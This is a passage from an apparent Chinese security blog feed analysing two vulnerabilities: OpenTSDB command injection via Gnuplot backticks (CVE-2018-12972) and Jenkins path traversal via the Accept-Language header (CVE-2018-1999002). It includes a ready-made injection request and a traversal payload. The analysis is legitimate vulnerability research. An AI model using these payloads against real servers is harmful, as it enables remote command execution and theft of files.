File(basepath).getParent(),</div><div class="line">      Const.MUST_BE_WRITEABLE, Const.CREATE_IF_NEEDED);</div><div class="line"> </div><div class="line">  ... <span class="comment">// 省略一些初始化的文件写入操作</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> (npoints == <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// 之前提到的 yrange 是通过put("yrange", value)获得</span></div><div class="line">    <span class="comment">// 但在这里由于某些条件(npoints == 0)会直接被硬编码为 [0:10]</span></div><div class="line">    params.put(<span class="string">"yrange"</span>, <span class="string">"[0:10]"</span>);  <span class="comment">// Doesn't matter what values we use.</span></div><div class="line">  &#125;</div><div class="line">  writeGnuplotScript(basepath, datafiles);</div><div class="line">  <span class="keyword">return</span> npoints;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>writeGnuplotScript(basepath, datafiles)</code>，这个方法会生成真正的Gnuplot脚本，方便起见我往里面加了注释<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Generates the Gnuplot script.</div><div class="line"> * <span class="doctag">@param</span> basepath The base path to use.</div><div class="line"> * <span class="doctag">@param</span> datafiles The names of the data files that need to be plotted,</div><div class="line"> * in the order in which they ought to be plotted.  It is assumed that</div><div class="line"> * the ith file will correspond to the ith entry in &#123;<span class="doctag">@code</span> datapoints&#125;.</div><div class="line"> * Can be &#123;<span class="doctag">@code</span> null&#125; if there's no data to plot.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeGnuplotScript</span><span class="params">(<span class="keyword">final</span> String basepath,</span></span></div><div class="line">                                <span class="keyword">final</span> String[] datafiles) <span class="keyword">throws</span> IOException &#123;</div><div class="line">  <span class="keyword">final</span> String script_path = basepath + <span class="string">".gnuplot"</span>;</div><div class="line"></div><div class="line">  <span class="comment">// gp即要生成的Gnuplot脚本</span></div><div class="line">  <span class="keyword">final</span> PrintWriter gp = <span class="keyword">new</span> PrintWriter(script_path);</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    <span class="comment">// XXX don't hardcode all those settings.  At least not like that.</span></div><div class="line">    gp.append(<span class="string">"set term png small size "</span>)</div><div class="line">      <span class="comment">// Why the fuck didn't they also add methods for numbers?</span></div><div class="line">      .append(Short.toString(width)).append(<span class="string">","</span>)</div><div class="line">      .append(Short.toString(height));</div><div class="line">    </div><div class="line">    <span class="comment">// 获取了 smooth，fgcolor，style，bgcolor这四个参数</span></div><div class="line">    <span class="keyword">final</span> String smooth = params.remove(<span class="string">"smooth"</span>);</div><div class="line">    <span class="keyword">final</span> String fgcolor = params.remove(<span class="string">"fgcolor"</span>);</div><div class="line">    <span class="keyword">final</span> String style = params.remove(<span class="string">"style"</span>);</div><div class="line">    String bgcolor = params.remove(<span class="string">"bgcolor"</span>);</div><div class="line">    </div><div class="line">    <span class="comment">// 一些边界情况</span></div><div class="line">    <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span> &amp;&amp; bgcolor == <span class="keyword">null</span>) &#123;</div><div class="line">      bgcolor = <span class="string">"xFFFFFF"</span>;  <span class="comment">// So use a default.</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (bgcolor != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span> &amp;&amp; <span class="string">"transparent"</span>.equals(bgcolor)) &#123;</div><div class="line">        bgcolor = <span class="string">"transparent xFFFFFF"</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="comment">//  往Gnuplot脚本中写入参数bgcolor</span></div><div class="line">      gp.append(<span class="string">' '</span>).append(bgcolor);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="comment">//  往Gnuplot脚本中写入参数fgcolor</span></div><div class="line">      gp.append(<span class="string">' '</span>).append(fgcolor);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    gp.append(<span class="string">"\n"</span></div><div class="line">              + <span class="string">"set xdata time\n"</span></div><div class="line">              + <span class="string">"set timefmt \"%s\"\n"</span></div><div class="line">              + <span class="string">"if (GPVAL_VERSION &lt; 4.6) set xtics rotate; else set xtics rotate right\n"</span></div><div class="line">              + <span class="string">"set output \""</span>).append(basepath + <span class="string">".png"</span>).append(<span class="string">"\"\n"</span></div><div class="line">              + <span class="string">"set xrange [\""</span>)</div><div class="line">      .append(String.valueOf((start_time &amp; UNSIGNED) + utc_offset))</div><div class="line">      .append(<span class="string">"\":\""</span>)</div><div class="line">      .append(String.valueOf((end_time &amp; UNSIGNED) + utc_offset))</div><div class="line">      .append(<span class="string">"\"]\n"</span>);</div><div class="line">    <span class="comment">//  往Gnuplot脚本中写入参数format x 会被双引号包裹</span></div><div class="line">    <span class="keyword">if</span> (!params.containsKey(<span class="string">"format x"</span>)) &#123;</div><div class="line">      gp.append(<span class="string">"set format x \""</span>).append(xFormat()).append(<span class="string">"\"\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (params != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">final</span> Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</div><div class="line">        <span class="comment">// 对params中剩下的参数，key即名字，value即对应的值</span></div><div class="line">        <span class="keyword">final</span> String key = entry.getKey();</div><div class="line">        <span class="keyword">final</span> String value = entry.getValue();</div><div class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</div><div class="line">          <span class="comment">// 往Gnuplot脚本中写入对应参数</span></div><div class="line">          gp.append(<span class="string">"set "</span>).append(key)</div><div class="line">            .append(<span class="string">' '</span>).append(value).write(<span class="string">'\n'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          gp.append(<span class="string">"unset "</span>).append(key).write(<span class="string">'\n'</span>);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    gp.write(<span class="string">"plot "</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nseries; i++) &#123;</div><div class="line">      ...</div><div class="line">      </div><div class="line">      <span class="keyword">if</span> (smooth != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="comment">// 往Gnuplot脚本中写入对应 smooth 参数</span></div><div class="line">        gp.append(<span class="string">" smooth "</span>).append(smooth);</div><div class="line">      &#125;</div><div class="line">      <span class="comment">// TODO(tsuna): Escape double quotes in title.</span></div><div class="line">      <span class="comment">// 往Gnuplot脚本中写入对应 title 参数，但是被双引号包裹了</span></div><div class="line">      gp.append(<span class="string">" title \""</span>).append(title).write(<span class="string">'"'</span>);</div><div class="line">      ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在完成了<code>plot.dumpToFiles(basepath);</code>后，开启子进程运行生成的Gnuplot脚本：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> Process gnuplot = <span class="keyword">new</span> ProcessBuilder(GNUPLOT,</div><div class="line">      basepath + <span class="string">".out"</span>, basepath + <span class="string">".err"</span>, basepath + <span class="string">".gnuplot"</span>).start();</div></pre></td></tr></table></figure></p>
<p>而gnuplot中允许使用反引号来执行sh命令，</p>
<p>交互模式下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5c96fb9c-94d2-1.png" alt="1.jpg"></p>
<p>脚本执行模式下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5cb0f308-94d2-1.png" alt="2.jpg"></p>
<p>因此我们可以通过远程控制特定的参数，使得Gnuplot在运行脚本时远程命令执行。支持远程命令执行的可控参数如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">y2range</td>
<td style="text-align:center">put(“y2range”, value)</td>
<td style="text-align:center">y2range</td>
</tr>
<tr>
<td style="text-align:center">key</td>
<td style="text-align:center">put(“key”, value)</td>
<td style="text-align:center">key</td>
</tr>
<tr>
<td style="text-align:center">bgcolor</td>
<td style="text-align:center">put(“bgcolor”, value)</td>
<td style="text-align:center">bgcolor</td>
</tr>
<tr>
<td style="text-align:center">fgcolor</td>
<td style="text-align:center">put(“fgcolor”, value)</td>
<td style="text-align:center">fgcolor</td>
</tr>
<tr>
<td style="text-align:center">smooth</td>
<td style="text-align:center">put(“smooth”, value)</td>
<td style="text-align:center">smooth</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:center">put(“style”, value)</td>
<td style="text-align:center">style</td>
</tr>
<tr>
<td style="text-align:center">o</td>
<td style="text-align:center">省略</td>
<td style="text-align:center">省略</td>
</tr>
</tbody>
</table>
</div>
<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>先查出可以使用的metrics<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /suggest?type=metrics&amp;q= HTTP/1.1</div></pre></td></tr></table></figure></p>
<p>发包，在参数位置处填入payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /q?start=2018/07/05-00:00:00&amp;end=2018/07/30-00:00:00&amp;m=sum:rate:env.air&amp;o=%6ls%60&amp;yrange=%5B0:%5D&amp;wxh=1900x738&amp;style=linespoint&amp;json HTTP/1.1</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5ccc0a58-94d2-1.png" alt="4.jpg"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5ce72842-94d2-1.png" alt="5.jpg"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http" target="_blank" rel="external">https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2511&quot;&gt;OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
    
      <category term="远程命令执行" scheme="http://chybeta.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】</title>
    <link href="http://chybeta.github.io/2018/08/07/Jenkins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1999002%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/07/Jenkins-任意文件读取漏洞复现与分析-【CVE-2018-1999002】/</id>
    <published>2018-08-07T14:25:11.000Z</published>
    <updated>2018-08-07T14:26:29.479Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2486" target="_blank" rel="external">Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】</a><br><a id="more"></a></p>
<h1 id="SECURITY-914-CVE-2018-1999002"><a href="#SECURITY-914-CVE-2018-1999002" class="headerlink" title="SECURITY-914 / CVE-2018-1999002"></a>SECURITY-914 / CVE-2018-1999002</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">An arbitrary file read vulnerability in the Stapler web framework used by Jenkins allowed unauthenticated users to send crafted HTTP requests returning the contents of any file on the Jenkins master file system that the Jenkins master process has access to.</div><div class="line"></div><div class="line">Input validation in Stapler has been improved to prevent this.</div></pre></td></tr></table></figure>
<p>漏洞影响版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Jenkins weekly up to and including 2.132</div><div class="line">Jenkins LTS up to and including 2.121.1</div></pre></td></tr></table></figure></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>测试环境： win平台</p>
<p>通过查找<a href="https://github.com/jenkinsci/jenkins/commit/29ca81dd59c255ad633f1bd86cf1be40a5f02c64" target="_blank" rel="external">commit记录</a>可知需要将其检出至 29ca81dd59c255ad633f1bd86cf1be40a5f02c64之前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; git clone https://github.com/jenkinsci/jenkins.git</div><div class="line">&gt; git checkout 40250f08aca7f3f8816f21870ee23463a52ef2f2</div></pre></td></tr></table></figure></p>
<p>检查<code>core/pom.xml</code>的第41行，确保版本为<code>1.250</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">staplerFork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">staplerFork</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">stapler.version</span>&gt;</span>1.250<span class="tag">&lt;/<span class="name">stapler.version</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>然后命令行下编译war包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mvn clean install -pl war -am -DskipTests</div></pre></td></tr></table></figure></p>
<p>在<code>jenkins\war\target</code>目录下获得编译好的<code>jenkins.war</code>，同目录下启动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar jenkins.war</div></pre></td></tr></table></figure></p>
<p>在管理员登陆（有cookie）的情况下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-16df43d6-902a-1.png" alt="winini.jpg"></p>
<p>在没有登陆（未授权，cookie清空）的情况下，只有当管理员开启了<code>allow anonymous read access</code>的时候，才能实现任意文件读取，否则仍需登陆。</p>
<p>开启：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-17004bda-902a-1.png" alt="allow.jpg"></p>
<p>未开启：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-172abca8-902a-1.png" alt="noallow.jpg"></p>
<p>而在linux下利用条件会更加苛刻，见后文。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以payload为例，请求的url为<code>/plugin/credentials/.ini</code>。而在<code>hudson/Plugin.java:227</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * This method serves static resources in the plugin under &lt;tt&gt;hudson/plugin/SHORTNAME&lt;/tt&gt;.</div><div class="line">**/</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doDynamic</span><span class="params">(StaplerRequest req, StaplerResponse rsp)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</div><div class="line">    String path = req.getRestOfPath();</div><div class="line"></div><div class="line">    String pathUC = path.toUpperCase(Locale.ENGLISH);</div><div class="line">    <span class="keyword">if</span> (path.isEmpty() || path.contains(<span class="string">".."</span>) || path.startsWith(<span class="string">"."</span>) || path.contains(<span class="string">"%"</span>) || pathUC.contains(<span class="string">"META-INF"</span>) || pathUC.contains(<span class="string">"WEB-INF"</span>)) &#123;</div><div class="line">        LOGGER.warning(<span class="string">"rejecting possibly malicious "</span> + req.getRequestURIWithQueryString());</div><div class="line">        rsp.sendError(HttpServletResponse.SC_BAD_REQUEST);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Stapler routes requests like the "/static/.../foo/bar/zot" to be treated like "/foo/bar/zot"</span></div><div class="line">    <span class="comment">// and this is used to serve long expiration header, by using Jenkins.VERSION_HASH as "..."</span></div><div class="line">    <span class="comment">// to create unique URLs. Recognize that and set a long expiration header.</span></div><div class="line">    String requestPath = req.getRequestURI().substring(req.getContextPath().length());</div><div class="line">    <span class="keyword">boolean</span> staticLink = requestPath.startsWith(<span class="string">"/static/"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">long</span> expires = staticLink ? TimeUnit2.DAYS.toMillis(<span class="number">365</span>) : -<span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="comment">// use serveLocalizedFile to support automatic locale selection</span></div><div class="line">    rsp.serveLocalizedFile(req, <span class="keyword">new</span> URL(wrapper.baseResourceURL, <span class="string">'.'</span> + path), expires);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>doDynamic</code>函数用于处理类似<code>/plugin/xx</code>的请求，<code>serveLocalizedFile</code>在<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/ResponseImpl.java</code>第209行左右：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">serveLocalizedFile</span><span class="params">(StaplerRequest request, URL res, <span class="keyword">long</span> expiration)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(!stapler.serveStaticResource(request, <span class="keyword">this</span>, stapler.selectResourceByLocale(res,request.getLocale()), expiration))</div><div class="line">        sendError(SC_NOT_FOUND);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先看最里面的<code>request.getLocale()</code>，然后再来分析<code>stapler.selectResourceByLocale()</code>。</p>
<p>跟入<code>request.getLocale()</code>，至<code>jetty-server-9.2.15.v20160210-sources.jar!/org/eclipse/jetty/server/Request.java:692</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> Locale <span class="title">getLocale</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        String language = (String)acceptLanguage.get(<span class="number">0</span>);</div><div class="line">        language = HttpFields.valueParameters(language,<span class="keyword">null</span>);</div><div class="line">        String country = <span class="string">""</span>;</div><div class="line">        <span class="keyword">int</span> dash = language.indexOf(<span class="string">'-'</span>);</div><div class="line">        <span class="keyword">if</span> (dash &gt; -<span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            country = language.substring(dash + <span class="number">1</span>).trim();</div><div class="line">            language = language.substring(<span class="number">0</span>,dash).trim();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Locale(language,country);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> Locale.getDefault();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里用于处理HTTP请求中的<code>Accept-Language</code>头部。比如<code>zh-cn</code>，则会根据<code>-</code>的位置被分为两部分，<code>language</code>为<code>zh</code>，<code>country</code>为<code>cn</code>，然后返回<code>Locale(language,country)</code>对象。倘若不存在<code>-</code>，则<code>country</code>为空，<code>language</code>即对应我们的payload:<code>../../../../../../../../../../../../windows/win</code>，则此时返回一个<code>Locale(language,&quot;&quot;)</code></p>
<p>返回后即进入<code>selectResourceByLocale(URL url, Locale locale)</code>,这里的<code>locale</code>参数即上一步返回的locale对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">OpenConnection <span class="title">selectResourceByLocale</span><span class="params">(URL url, Locale locale)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    <span class="comment">// hopefully HotSpot would be able to inline all the virtual calls in here</span></div><div class="line">    <span class="keyword">return</span> urlLocaleSelector.open(url.toString(),locale,url);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>urlLocaleSelector</code>对象的声明见<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:390</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> LocaleDrivenResourceSelector urlLocaleSelector = <span class="keyword">new</span> LocaleDrivenResourceSelector() &#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function">URL <span class="title">map</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> URL(url);</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>在<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:324</code>实现了<code>LocaleDrivenResourceSelector</code>类的<code>open</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">LocaleDrivenResourceSelector</span> </span>&#123;</div><div class="line">    <span class="comment">/**</span></div><div class="line">        * The 'path' is divided into the base part and the extension, and the locale-specific</div><div class="line">        * suffix is inserted to the base portion. &#123;<span class="doctag">@link</span> #map(String)&#125; is used to convert</div><div class="line">        * the combined path into &#123;<span class="doctag">@link</span> URL&#125;, until we find one that works.</div><div class="line">        *</div><div class="line">        * &lt;p&gt;</div><div class="line">        * The syntax of the locale specific resource is the same as property file localization.</div><div class="line">        * So Japanese resource for &lt;tt&gt;foo.html&lt;/tt&gt; would be named &lt;tt&gt;foo_ja.html&lt;/tt&gt;.</div><div class="line">        *</div><div class="line">        * <span class="doctag">@param</span> path</div><div class="line">        *      path/URL-like string that represents the path of the base resource,</div><div class="line">        *      say "foo/bar/index.html" or "file:///a/b/c/d/efg.png"</div><div class="line">        * <span class="doctag">@param</span> locale</div><div class="line">        *      The preferred locale</div><div class="line">        * <span class="doctag">@param</span> fallback</div><div class="line">        *      The &#123;<span class="doctag">@link</span> URL&#125; representation of the &#123;<span class="doctag">@code</span> path&#125; parameter</div><div class="line">        *      Used as a fallback.</div><div class="line">        */</div><div class="line">    <span class="function">OpenConnection <span class="title">open</span><span class="params">(String path, Locale locale, URL fallback)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        String s = path;</div><div class="line">        <span class="keyword">int</span> idx = s.lastIndexOf(<span class="string">'.'</span>);</div><div class="line">        <span class="keyword">if</span>(idx&lt;<span class="number">0</span>)   <span class="comment">// no file extension, so no locale switch available</span></div><div class="line">            <span class="keyword">return</span> openURL(fallback);</div><div class="line">        String base = s.substring(<span class="number">0</span>,idx);</div><div class="line">        String ext = s.substring(idx);</div><div class="line">        <span class="keyword">if</span>(ext.indexOf(<span class="string">'/'</span>)&gt;=<span class="number">0</span>) <span class="comment">// the '.' we found was not an extension separator</span></div><div class="line">            <span class="keyword">return</span> openURL(fallback);</div><div class="line"></div><div class="line">        OpenConnection con;</div><div class="line"></div><div class="line">        <span class="comment">// try locale specific resources first.</span></div><div class="line">        con = openURL(map(base + <span class="string">'_'</span> + locale.getLanguage() + <span class="string">'_'</span> + locale.getCountry() + <span class="string">'_'</span> + locale.getVariant() + ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        con = openURL(map(base+<span class="string">'_'</span>+ locale.getLanguage()+<span class="string">'_'</span>+ locale.getCountry()+ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        con = openURL(map(base+<span class="string">'_'</span>+ locale.getLanguage()+ext));</div><div class="line">        <span class="keyword">if</span>(con!=<span class="keyword">null</span>)   <span class="keyword">return</span> con;</div><div class="line">        <span class="comment">// default</span></div><div class="line">        <span class="keyword">return</span> openURL(fallback);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">        * Maps the 'path' into &#123;<span class="doctag">@link</span> URL&#125;.</div><div class="line">        */</div><div class="line">    <span class="function"><span class="keyword">abstract</span> URL <span class="title">map</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先看看开头的注释，这段代码本意是想根据对应的语言（Accept-Language）来返回不同的文件，比如在<code>ja</code>的条件下请求<code>foo.html</code>，则相当于去请求<code>foo_ja.html</code>，这个过程会先把<code>foo.html</code>分成两部分：文件名<code>foo</code>和扩展名<code>.html</code>，然后根据具体的语言/国家来组合成最终的文件名。</p>
<p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p>
